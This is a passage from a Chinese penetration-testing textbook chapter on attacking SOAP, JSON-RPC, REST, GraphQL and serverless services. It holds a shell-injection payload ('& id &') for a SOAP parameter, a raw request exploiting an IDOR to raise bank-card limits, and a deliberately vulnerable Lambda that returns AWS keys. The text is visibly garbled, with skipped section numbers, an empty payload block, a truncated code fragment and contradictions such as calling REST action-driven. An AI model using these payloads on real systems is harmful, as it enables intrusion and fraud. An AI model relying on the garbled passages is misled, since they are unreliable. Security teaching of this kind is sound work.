# 第 11 章 渗透测试 Web 服务与云服务

## 11.1 引言

Web 服务是为了让异构系统能够相互通信而开发的。例如，一个用 Java 编写、托管在 Linux 操作系统上的应用程序可以与 Windows 操作系统上的 ASP.NET 应用程序无缝通信。同样，Windows 服务器上的 Node.js 应用程序可以从嵌入式系统上的 IoT 设备请求实时更新。

这些服务使用统一的通信媒介，利用 HTTP/HTTPS 协议和 XML/JSON 等数据格式进行数据传输。这通过使不同的系统和应用程序能够在不了解彼此架构的情况下交换和理解数据，从而促进了互操作性。

需要理解的是，Web 服务不仅由 Web 应用程序消费，也由用户消费。移动应用程序就是一个突出的例子。这些应用程序通常依赖 Web 服务来检索数据、执行交易以及与远程服务器通信。

Web 服务主要有两种类型：RPC（远程过程调用）和 REST（表述性状态转移）。RPC 使用诸如 XML-RPC（使用 XML 进行数据传输）和 JSON-RPC（使用 JSON）等协议。SOAP 是一种协议，可视为 XML-RPC 的后继者；它通过使用加密和数字签名提供了更好的安全性。

另一方面，REST 是一种架构风格，已成为构建 Web 服务最广泛使用的选择。它利用 HTTP 协议的无状态特性（即每个请求独立于其他请求进行处理），在可扩展性和性能方面提供了更好的选择。

### 11.1.1 RPC 与 REST 的区别

以下是 RPC 和 REST 之间的一些关键区别：

|          | RPC                                  | REST                                 |
|----------|--------------------------------------|--------------------------------------|
| **焦点** | 动作驱动                             | 数据驱动                             |
| **说明** | RPC 以名词为中心；侧重于远程函数/过程的调用并返回客户端响应。通常在你希望提供一组严格指令时使用。 | REST 以资源为中心；使用 HTTP 动词与资源交互。侧重于使用 HTTP 方法执行的操作。 |
| **方法示例** | 考虑一个负责管理预订的 Web 服务。RPC 将调用用于搜索酒店和预订的方法：<br>`hotelSearch(location, check-in, check-out)`——根据位置和日期检索酒店可用性。<br>`bookHotel(hotelId, guestInfo)`——为选定的酒店进行预订。 | REST API 将具有诸如“hotels”之类的端点，并使用 HTTP 动词来检索酒店，而不是调用唯一的函数。<br>`GET /hotels/{hotelId}`——检索酒店列表。<br>`POST /hotels/{hotelId}/bookings`——为选定的酒店进行预订。 |
| **用例** | 在根据特定条件搜索可用酒店时很有用。 | 在检索酒店列表时很有用。然而，它们可以互换使用。 |

### 11.1.2 单体架构与分布式架构

与过去应用程序构建在单体架构上不同，Web 服务也促进了更通用和分布式系统的创建。在单体架构中，一个单一的服务器保存整个 Web 应用程序代码以及相关组件（如数据库）。虽然这种方法在易于管理方面具有优势，但它也有自己的缺点，其中一个组件出现故障就可能导致整个系统瘫痪——Web 服务迎来了微服务架构时代。在这里，应用程序被分解为松散耦合的服务，每个服务执行特定的功能。这消除了单点故障，提高了整体系统的弹性。

让我们以预订网站为例。它由几个微服务组成，每个微服务负责一个特定的功能：用户登录服务处理用户认证和授权；预订搜索服务返回特定日期的可用酒店并提供价格比较；预订服务管理房间预订、确认和取消；支付服务处理交易和第三方交互。

如果在任何时候，预订搜索微服务宕机，用户仍然能够登录其账户、查看和取消现有预订，并访问其他功能。与单体架构相比，这提供了显著的优势，因为如果发生故障，整个系统都会宕机。同样，微服务架构可能允许根据需求进行选择性扩展。例如，在旺季，预订搜索服务和预订服务可能经历高需求，而其他组件则不然。这就是 Docker 和 Kubernetes 等技术发挥作用的地方。

在这种设计中，每个微服务都托管在自己的 Docker 容器中，Kubernetes 用于管理和编排这些服务，允许独立扩展特定服务而不影响系统的其余部分。

## 11.2 SOAP 简介

SOAP 是一种 RPC 协议，它使用 XML 访问 Web 服务，在 REST 之前广泛流行。虽然 SOAP 如今不再非常普遍，但在许多企业系统中仍在使用。

由于 SOAP 基于 XML 协议构建，我们在前面章节中研究的所有基于 XML 的漏洞（如 XPath、XML、XXE 注入等）在处理 SOAP 应用程序时仍然适用。

必须理解的是，这些漏洞并非 SOAP 协议本身固有的，而是 Web 应用程序处理 SOAP 消息的方式导致的。如果来自 SOAP 请求的数据在未经适当清理或参数化的情况下用于构造 SQL 查询，并且如果来自 SOAP 请求的数据未经清理就传递给 shell 函数，则会导致远程代码执行。

让我们看一个 SOAP 消息的示例：

**请求**
```xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="www.w3.org/2003/05/soap-envelope" xmlns:m="www.example.com">
    <soap:Header>
    </soap:Header>
    <soap:Body>
        <m:MethodName>
            <m:ParamName>PARAMETER</m:ParamName>
        </m:MethodName>
    </soap:Body>
</soap:Envelope>
```

在此 SOAP 请求示例中，“ParamName”字段是“MethodName”函数中的一个输入参数，该函数在收到 SOAP 消息时在服务器端被调用。

### 11.2.1 与 SOAP 服务交互

一旦识别出 SOAP 服务，下一步就是了解如何与之交互。与通常需要外部文档的 REST API 不同，SOAP 服务通常提供 Web 服务描述语言（WSDL）文档，这是一个 XML 文档，可以视为一种内置文档。

WSDL 文件提供了 Web 服务允许的操作的完整列表，指定了所需的参数、输入和输出的正确语法甚至数据类型。该文件通常在 SOAP Web 服务必须对公众保持可访问性时使用。虽然它为开发人员提供了与 Web 服务交互的简化方式，但也为攻击者提供了识别潜在漏洞的宝贵信息。

WSDL 文件通常可以通过在端点 URL 后附加“?wsdl”来访问。例如，如果您的 Web 服务端点是 `http://example.com/webservice`，您可以通过导航到 `http://example.com/webservice?wsdl` 来访问 WSDL 文档。

### 11.2.4 SOAP 服务中的远程代码执行（RCE）

如前所述，如果 SOAP 消息未正确处理，且用户提供的输入未经适当清理和验证就插入 Shell 函数，则可能导致 RCE。

考虑一个在渗透测试中发现的基于 SOAP 服务的 RCE 示例。通过 `<user>` 参数提供的输入直接插入到 shell 函数中，导致命令执行。后端操作系统被枚举为 Linux，因此提供了 `id` 命令，该命令将显示用户和组 ID。以下是提供的初始有效载荷：

**有效载荷**
```
"& id &"
```

**有效载荷**
```

```

## 11.3 JSON-RPC 漏洞

JSON-RPC 是一种 RPC 协议，利用 JSON 在客户端和服务器之间交换消息。与 XML-RPC 相比，JSON-RPC 具有多项优势，例如使用 JSON 实现人类可读消息以及更小的消息大小，从而提高网络性能和效率。

根据 JSON-RPC 的实现方式以及用户输入的处理方式，JSON-RPC 可能导致 SQL 注入、RCE 和 IDOR。

为了说明，让我们看一个 JSON-RPC 的基本请求和响应示例。以下请求调用“getEmail”方法以获取 userID 1 的详细信息。

**请求：**
```json
{
    "jsonrpc": "2.0",   // 指定版本
    "method": "getEmail", // 指示正在调用的方法
    "params": {
        "userId": 1
    },                  // 包含输入参数
    "id": 1             // 分配唯一标识符以匹配请求/响应
}
```

此请求是使用 JSON 序列化的单个对象，包含三个属性：method、params 和 ID。以下是示例响应：

**响应：**
```json
{"jsonrpc": "2.0", "result": "tmgm@tmgm.com", "id": 1}
```

现在，让我们看一个来自涉及银行应用程序的渗透测试的真实 IDOR 示例。该应用程序容易受到 IDOR 攻击，允许用户修改“信用卡”限额，使其超过应用程序定义和界面限制的最大阈值。

由于信用卡限额基于用户的个人资料和信用历史，并且欺诈检测系统使用异常交易作为识别潜在欺诈活动的手段，如果用户能够在不经过风险评估的情况下修改其限额，这将有效绕过这些控制。同样，如果攻击者获得了多个账户，他们可能会大规模利用此漏洞。

在以下请求中，调用了方法“tmgmBanking.card.setlimits”，并修改了与“TransactionMaxLimit*”关联的参数以实现此效果。

**请求**
```
POST /rpc/tmgmBanking.card.setlimits HTTP/1.1
Host: redacted
Accept: */*
Content-Type: application/json
Authorization: 
Cookie: [omitted]
Content-Length: 411
User-Agent: redacted
Accept-Language: en
Accept-Encoding: gzip, deflate
Connection: close

{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tmgmBanking.card.setlimits",
    "params": {
        "transactionMaxLimit": "50000000000000",
        "transactionMaxLimitDaily": 50000000000000,
        "transactionMaxLimitWeekly": 50000000000000,
        "transactionMaxLimitMonthly": 50000000000000,
        "contactlessEnabled": true,
        "onlineEnabled": true,
        "atmEnabled": true
    }
}
```

## 11.4 REST API

REST Web 服务主要使用 JSON 或 XML 进行数据传输；然而，消息格式并不严格限于这些格式。其他格式（如纯文本、HTML 等）也可以用作消息格式。REST API 背后的设计理念是易用性和可扩展性，使其成为构建现代 Web 应用程序的最常见选择。

当与使用 REST API 进行数据传输的 Web 应用程序交互时，通过分析跨端点的请求/响应，可以获得有关底层 API 的宝贵见解。这可能揭示诸如 API 端点、HTTP 方法和请求中传递的参数等有价值的细节。

如前所述，REST API 是动作驱动的，动作基于 HTTP 动词。为了说明，让我们考虑传统的酒店预订网站示例，并探讨如何实现每种请求方法：

### 11.4.1 请求方法

| HTTP 方法 | 端点                | 用途                                                         |
|-----------|---------------------|--------------------------------------------------------------|
| GET       | /hotel              | 检索酒店列表或特定酒店的详细信息。                           |
| POST      | /hotel              | 创建新的酒店资源。                                           |
| PUT       | /hotel/{hotelId}    | 更新特定酒店的信息。                                         |
| DELETE    | /hotel/{hotelId}    | 删除特定酒店。                                               |

此外，还有诸如 OPTIONS（将揭示可用方法）和 HEAD（检索元数据）等方法。

根据应用程序的逻辑以及输入的处理方式，RESTful API 与其对应项一样，可能容易受到注入攻击、敏感数据泄露、XXE、IDOR 等攻击。让我们看几个 REST API 真实漏洞的示例。

### 11.4.2 识别 REST API 端点

正如 SOAP 服务附带 WSDL 文件一样，开发人员可能会选择使用 Swagger（现称为 OpenAPI）框架来设计和记录 RESTful API。该框架使开发人员能够详细描述其 API 的结构，包括每个可能 API 调用的名称、路径和参数。Swagger 定义通常以 JSON 或 YAML 格式编写。

当应用程序使用带有 Swagger 文档的 REST API 时，它固有地暴露了一组端点，这些端点提供了有关 API 结构和功能的见解。通常，Swagger 端点可以位于：

**示例**
- `/swagger-ui.html`
- `/swagger`
- `/v1/swagger-ui.html`
- `/api/v1/swagger.json`
- `/api/v1/swagger.yaml`
- `/v2/api-docs`
- `/v1/v2/api-docs`

有关更全面的列表，请参考 SecLists 的 discovery/swagger.txt 文件 [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/swagger.txt]。此外，重要的是要监视任何检索 `.json` 或 `.yaml` 文件的请求。这些可能是 Swagger 文档文件，并且它们可能位于自定义端点。

### 11.4.3 示例 1：过度数据暴露

过度数据暴露是指 API 公开的数据超出用户或客户端执行特定任务所需的数据。本质上，它违反了最小权限原则，即用户只应拥有执行其任务所需的最低访问权限。在更广泛的范围内，我们可以将过度数据暴露视为信息泄露的一个特定实例，因此它是此更广泛类别的一个子类。

在我们的一次渗透测试中，我们发现一个端点没有根据敏感性过滤对象属性。因此，它泄露了与 API 注册的所有用户相关的敏感信息，而没有考虑用户和数据的个别敏感性。暴露的数据包括名字、姓氏、全名、电话号码、权限等。

以下请求揭示了用户“admin”的详细信息。攻击者可以通过使用常见用户名列表并系统地枚举应用程序中其他用户的详细信息来利用此漏洞。

**POC**
```
https://example.com/rest/v11/Users?=admin
```

## 11.5 GraphQL 漏洞

GraphQL 由 Facebook 开发，后来开源，使开发人员能够贡献和增强；此后，该项目由 GraphQL 基金会维护。这导致了各种 GraphQL 库、工具和框架的创建。

与通常涉及多个端点与不同 HTTP 动词（GET、PUT、POST、PATCH、DELETE）交互的 REST API 不同，GraphQL 有一个单一端点，服务于所有预定义对象。GraphQL 支持两种操作，即 Query 和 Mutate。Query 用于检索数据，而 Mutation 用于更新和删除数据。这从开发人员的角度带来了效率和灵活性，消除了管理多个端点的需要。

从安全角度来看，GraphQL 不提供内置的安全机制。在标准配置中，如果未应用访问控制，它将返回所有查询的对象，导致敏感数据暴露。与 REST 或 SOAP 类似，具有 GraphQL 的应用程序也可能容易受到传统漏洞的攻击，包括 SQL 注入、RCE、XSS 等，具体取决于逻辑和输入处理。

以我们的传统酒店预订网站为例，让我们探讨如何实现每种请求方法。在这些示例中，所有请求都将发送到单个端点，通常是 `/graphql` 端点，请求体决定了具体的操作和动作。

| 方法  | 示例请求体                                    | 用途                                         |
|-------|-----------------------------------------------|----------------------------------------------|
| Query | `{ hotels { id name } }`                      | 检索酒店列表及其 ID 和名称。                 |
| Query | `{ hotel(id: "1") { id name } }`              | 通过 ID 检索特定酒店的详细信息。             |
| Mutation | `mutation { addHotel(name: "New Hotel") { id name } }` | 创建新的酒店资源。              |
| Mutation | `mutation { updateHotel(id: "123", name: "Updated Hotel") { id name } }` | 通过 ID 更新特定酒店的信息。 |
| Mutation | `mutation { deleteHotel(id: "123") { id name } }` | 通过 ID 删除特定酒店。          |

### 11.5.1 枚举 GraphQL 端点

与 REST API 相比，枚举 GraphQL 更容易，因为它使用单个端点，从而减少了模糊测试的目标数量，同时产生的噪音也更少。以下是常见端点列表：

**示例**
- `/v2/playground`
- `/v2/subscriptions`
- `/v2/api/graphql`
- `/v2/graph`
- `/v3/altair`
- `/v3/explorer`
- `/v3/graphiql`

有关更全面的列表，请参考 SecLists 的 discovery/graphql.txt 文件 [https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt]。某些 GraphQL 端点可能具有描述性，并明确提供有关结构和实现的信息，而其他端点可能配置为提供最少或不提供信息。根据具体实现，当 GraphQL 端点遇到无法解析的非 GraphQL 查询或格式不正确的请求时，可能会返回诸如“query not present”或“Field 'x' doesn't exist on type 'y'”之类的错误。

### 11.5.2 GraphQL 内省

在 GraphQL 的上下文中，内省是一项允许用户通过查询获取有关 GraphQL 模式的有价值信息（如模式、字段、可用的查询和变更等）的功能。然而，从安全角度来看，建议在生产环境中禁用内省，或仅将其访问权限限制为授权用户。

尽管如此，在启用内省的 GraphQL 实现中，发现这种情况很常见。虽然 GraphQL 支持其他消息格式，但 JSON 是 GraphQL 请求最常用的格式，因为它简单且得到广泛支持。

为了详细探讨该主题，我们将使用“Damn Vulnerable GraphQL Application”（DVGA）[https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application] 中的示例。DVGA 是故意设计为不安全的，允许用户测试各种 GraphQL 特定漏洞（如内省、DOS 等）以及常见漏洞（包括 SQL 注入、RCE、XSS 等）。

## 11.9 无服务器应用程序漏洞

“无服务器计算”或“无服务器架构”这个术语可能具有误导性，因为它可能让一些人认为不涉及服务器。实际上，它意味着服务器管理的责任外包给云服务提供商，开发人员只负责编写代码和设计业务逻辑。换句话说，您的应用程序在服务器上运行，但所有服务器管理（包括扩展和维护）都由云服务提供商处理。

无服务器应用程序具有某些区别于传统 Web 应用程序的特征。以下是一些显著特征：

- **API 路由**：为您的函数提供路由，使其可被互联网访问。此层根据 URL 和其他因素决定将请求发送到何处。这在 AWS 中称为 API 网关，在 Azure 中称为 Azure 应用程序网关。
- **事件驱动**：在无服务器架构中，操作由事件触发，事件可以是用户点击链接/按钮到用户将文件上传到 S3 存储桶的任何操作。
- **无状态性**：无服务器函数的生命周期有限，通常持续不超过几分钟。因此，没有缓存，每次再次执行函数时状态都会重新启动。

### 11.9.1 函数即服务（FaaS）

FaaS 是在云环境中运行的一种特定类型的无服务器计算。通过 FaaS，开发人员可以部署单个函数或业务逻辑片段，这些函数在响应事件（如用户点击 Web 应用程序的某个部分、文件上传或数据库更改）时执行，并且您只需为这些函数的执行时间付费。FaaS 的突出示例包括 AWS Lambda、Google Cloud Functions 和 Microsoft Azure Functions。

让我们以基于云的漏洞扫描服务为例。前端应用程序将域名作为输入，并将其发送到检测微服务。该微服务执行漏洞评估并将结果返回给前端。在这种情况下，微服务始终处于运行状态，产生成本。然而，通过 FaaS，它可以按需部署，从而降低成本。

总而言之，FaaS 可以被视为无服务器，但并非所有无服务器架构都是 FaaS。还有其他类别的无服务器服务，包括数据库即服务（DBaaS）、存储即服务（STaaS）等。诸如 AWS DynamoDB 或 Google Firestore（DBaaS）和 AWS S3（STaaS）等热门服务都是无服务器的。

以下是一个使用 Node.js 的基本 AWS Lambda 函数示例：

**代码**
```javascript
exports.handler = async () => {
    return {
        statusCode: 200,
        body: 'Hello World!'
    };
};
```

## 11.10 敏感信息泄露

FaaS 有时可能导致敏感数据泄露，具体取决于特定的业务逻辑。为了说明，让我们看一个 Lambda 函数示例，该函数检查输入事件中 debug 键的值。如果 debug 参数设置为“True”，它将返回存储在环境变量中的 AWS 访问密钥和秘密访问密钥。否则，它将返回一个简单的“Hello World!”问候消息。

**代码**
```python
import os
import json

def lambda_handler(event, context):
    query_params = event['queryStringParameters']
    debug = query_params.get('debug', 'false').lower() == 'true'

    if debug:
        return {
            'statusCode': 200,
            'body': json.dumps({
                'access_key': os.getenv('AccessKey'),
                'secret_access_key': os.getenv('AccessSecret')
            }),
        }
    else:
        return {
            'statusCode': 200,
            'body': json.dumps('Hello World!'),
        }
```

### 11.10.1 无服务器事件注入

如前所述，在无服务器架构中，函数是针对某些事件或触发器执行的。然而，这些事件可能被攻击者从受信任的来源控制，并插入到 shell 函数中，从而导致代码执行。以下是受信任来源的示例：

- **S3 对象上的操作**：诸如文件上传或删除等活动
- **消息队列和发布/订阅系统**：诸如 AWS SQS（简单队列服务）之类的服务，当消息添加到队列或主题时可以触发无服务器函数
- **警报系统**：来自警报系统（如 CloudWatch 警报）的通知
- **API 网关调用**：通过网关进行的 HTTP 调用
- **代码仓库中的更改**：对代码仓库的更新
- **数据库事件**：对数据库的任何操作，如插入或更新

为了更好地理解这一点，让我们考虑一个示例：OWASP ServerlessGoat 应用程序，这是一个故意不安全的基于 AWS Lambda 的无服务器应用程序。该应用程序实现了一项功能，接受 MS-Word 文档作为输入并返回文档中的文本。为了实现此功能，应用程序接受包含 Word 文件的 URL 作为输入，并检索 .doc 文件的内容。

### 11.10.2 易受攻击代码分析

```javascript
        TableName: process.env.TABLE_NAME,
        Item: {
            'id': requestid,
            'ip': ip,
            'document_url': documentUrl
        }
    }).promise();
}

exports.handler = async (event) => {
```

- **GraphQL 漏洞**：使用 Damn Vulnerable GraphQL 应用程序深入探讨与 GraphQL 相关的漏洞，如 GraphQL 注入、信息泄露、SSRF 和命令注入。您可以在此处找到针对每个漏洞的 Postman 集合 [www.postman.com/devrel/workspace/graphql-security-101/request/14270212-838d332c-c40f-46a8-ab84-247eea9e0cb1]。
- **无服务器漏洞**：通过下载并实验 DVFaaS（Damn Vulnerable Functions as a Service）来增强您对无服务器漏洞的熟悉程度 [https://github.com/we45/DVFaaS-Damn-Vulnerable-Functions-as-a-Servic]。
